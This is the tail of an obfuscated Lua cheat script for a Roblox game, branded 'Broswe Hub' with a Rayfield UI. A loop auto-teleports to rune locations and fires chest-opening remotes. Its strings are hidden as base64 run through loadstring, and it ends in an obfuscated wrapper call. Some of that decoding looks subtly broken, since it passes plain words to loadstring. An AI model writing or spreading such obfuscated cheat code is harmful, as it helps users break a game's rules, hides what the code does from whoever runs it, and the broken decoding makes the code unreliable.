        if autoDarkRuneEnabled then teleportToDarkRune() task.wait(6) end
        if autoLightRuneEnabled then teleportToLightRune() task.wait(6) end
        if autoUnderwaterEnabled then teleportToUnderwater() task.wait(6) end
        if autoT1ChestEnabled then fireMain(loadstring(base64decode("T3BlbkNoZXN0"))(), loadstring(base64decode("VDFUcmlhbENoZXN0"))(), 10) end
        if autoT2ChestEnabled then fireMain(loadstring(base64decode("T3BlbkNoZXN0"))(), loadstring(base64decode("VDJUcmlhbENoZXN0"))(), 10) end
        task.wait(0.01)
    end
end)

Rayfield:Notify({
    Title = loadstring(base64decode("QnJvc3dlIEh1YiBMb2FkZWQ="))(),
    Content = loadstring(base64decode("RnVsbCBTb3VyY2UgU2NyaXB0IExvYWRlZCE="))(),
    Duration = 6
})
end
FBUvNEf8(cAVqh)
end)(...)
